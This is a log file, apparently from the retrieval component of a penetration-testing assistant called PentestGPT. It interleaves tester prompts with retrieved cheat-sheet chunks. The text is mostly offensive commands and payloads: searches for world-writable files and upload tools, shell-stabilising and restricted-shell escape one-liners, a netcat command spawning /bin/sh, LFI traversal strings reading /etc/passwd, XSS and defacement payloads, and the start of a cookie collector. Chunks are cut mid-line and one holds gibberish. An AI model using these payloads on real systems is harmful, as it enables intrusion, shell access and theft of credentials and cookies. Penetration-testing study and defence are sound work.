find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files


Preparation & Finding Exploit Code
What development tools/languages are installed/supported?
find / -name perl*
find / -name python*
find / -name gcc*
find / -name cc


How can files be uploaded?
find / -name wget
find / -name nc*
find / -name netcat*
find / -name tftp*
find / -name ftp


Stable shell
Spawn Interactive Shell and set env  
````
python -c 'import pty;pty.spawn("/bin/bash");'  
ctrl z  
echo $TERM  
stty -a  
stty raw -echo  
fg  

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH  
export TERM=xterm256-color  
export SHELL=bash  

stty rows \<> colums \<>  
````


Restricted bash
````
perl -e 'exec "/bin/sh";'  
/bin/sh -i  
exec "/bin/sh";  
echo os.system('/bin/bash')  
/bin/sh -i  
ssh user@$ip nc $localip 4444 -e /bin/sh  
export TERM=linux  
````
2024-05-07 09:27:33,245 - INFO - pentestgpt.utils.rag.Local_RAG - - searchsploit.md [Chunk 0] (Score: 1.23) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 

Can you craft another exploit? | rag-data: # SearchSploit
  Usage: searchsploit [options] term1 [term2] ... [termN]

==========
 Examples 
==========
  searchsploit afd windows local
  searchsploit -t oracle windows
  searchsploit -p 39446
  searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
  searchsploit -s Apache Struts 2.0.0
  searchsploit linux reverse password
  searchsploit -j 55555 | jq
  searchsploit --cve 2021-44228

  For more examples, see the manual: https://www.exploit-db.com/searchsploit

searchsploit output looks like this, where the left column contains the title of the exploit, and the right column contains a filepath or url to the exploit file.
------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                          |  Path
------------------------------------------------------------------------ ---------------------------------
Oracle 10g (Windows x86) - 'PROCESS_DUP_HANDLE' Local Privilege Escalat | windows_x86/local/3451.c
Oracle 9i XDB (Windows x86) - FTP PASS Overflow (Metasploit)            | windows_x86/remote/16731.rb
Oracle 9i XDB (Windows x86) - FTP UNLOCK Overflow (Metasploit)          | windows_x86/remote/16714.rb
Oracle 9i XDB (Windows x86) - HTTP PASS Overflow (Metasploit)           | windows_x86/remote/16809.rb
Oracle MySQL (Windows) - FILE Privilege Abuse (Metasploit)              | windows/remote/35777.rb
Oracle MySQL (Windows) - MOF Execution (Metasploit)                    
2024-05-07 09:33:05,593 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 5] (Score: 1.35) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 

Can you not use the shadow file since we do not have permission to read it?  | rag-data: 2.168.0.24\\folder ljahdçjkhadkahdkjahsdlkjahsdlkhadklad
```

## Web Application

### Web Remote code

### LFI (Local File Inclusion)

Situation

```
http://<target>/index.php?parameter=value
```

#### How to Test

```
http://<target>/index.php?parameter=php://filter/convert.base64-encode/resource=index
```

```
http://<target>/script.php?page=../../../../../../../../etc/passwd

```

```
http://<target>/script.php?page=../../../../../../../../boot.ini
```

#### LFI Payloads

- [Payload All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders)
- [Seclist LFI Intruder](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### encode

## XSS

### Reflected

#### Simple test

This is a simple test to see what happens, this is not a prove that the field is vuln to xss

```javascript
<plaintext>
```

#### Simple XSS test

```javascript
<script>alert('Found')</script>
```

```javascript
"><script>alert(Found)</script>">
```

```javascript
<script>alert(String.fromCharCode(88,83,83))</script>
```

#### Bypass filter of tag script

`"  onload="alert(String.fromCharCode(88,83,83))`

```javascript
" onload="alert('XSS')
```

bla is not a valid image, so this cause an error

```javascript
<img src='bla' onerror=alert("XSS")>
```

### Persistent

```javascript
>document.body.innerHTML="<style>body{visibility:hidden;}</style><div style=visibility:visible;><h1>HACKED!</h1></div>";
```

### PHP collector

`> cookie.txt`
`chmod 
2024-05-07 09:34:45,245 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 0] (Score: 1.41) | prompt: Continue to the previous request to dig into the problem, the penetration tester does not know how to proceed. Below is his description on the task. Please search in yoru knowledge base and try to identify all the potential ways to solve the problem. 
You should cover as many points as possible, and the tester will think through them later. Below is his description on the task. 

What should we do now? | rag-data: <p align="center">
  <img src="https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets/blob/master/CheatSheets/28533648.png" alt="Pentest Cheat Sheets" width="300" />
</p>

<p align="center">
  Pentest-Cheat-Sheets<br>
  @n3k00n3 | @UserXGnu | @alacerda
</p>

This repo has a collection of snippets of codes and commands to help our lives!
The main purpose is not be a crutch, this is a way to do not waste our precious time!
This repo also helps who trying to get OSCP. You'll find many ways to do something without Metasploit Framework.


### Nslookup

Resolve a given hostname to the corresponding IP.

```shell
nslookup targetorganization.com
```

### Reverse DNS lookup

```shell
nslookup -type=PTR IP_address
```

### MX(Mail Exchange) lookup

```shell
nslookup -type=MX domain
```

### Zone Transfer

#### Using nslookup Command

```shell
nslookup
server domain.com
ls -d domain.com
```

#### Using HOST Command

host -t ns(Name Server) < domain >

```shell
host -t ns domain.com
```

after that test nameservers

host -l < domain > < nameserver >

```shell
host -l domain.com ns2.domain.com
```

### Nmap Dns Enumaration

```
nmap -F --dns-server <dns server ip> <target ip range>
```

### Auto tools

#### DNSenum

```
dnsenum targetdomain.com
```

```
dnsenum --target_domain_subs.txt -v -f dns.txt -u a -r targetdomain.com
```

#### DNSmap

```bash
targetdomain.com
```

```bash
dnsmap targetdomain.com -w <Wordlst file.txt>
```

Brute Force, the file is saved in /tmp

```bash
dnsmap targetdom
